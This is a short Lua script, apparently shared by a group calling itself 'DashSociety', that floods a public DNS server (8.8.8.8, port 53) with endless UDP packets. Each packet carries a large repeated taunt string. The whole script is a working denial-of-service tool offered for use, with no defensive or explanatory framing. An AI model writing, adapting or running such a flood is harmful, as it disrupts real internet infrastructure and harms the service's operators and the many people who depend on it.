
-- DashSociety | Made for a friend.

local sock = require("socket")
local host, port = "8.8.8.8", 53
local data = "";

io.write("Generating Data ....")

for i = 0, 8000 do
    data = data .. "DashSociety owns you!"
end

while true do
    local conn = assert(sock.udp())

    conn:settimeout(0)

    assert(conn:setpeername(host, port))
    assert(conn:send(data))

    conn:close();
end
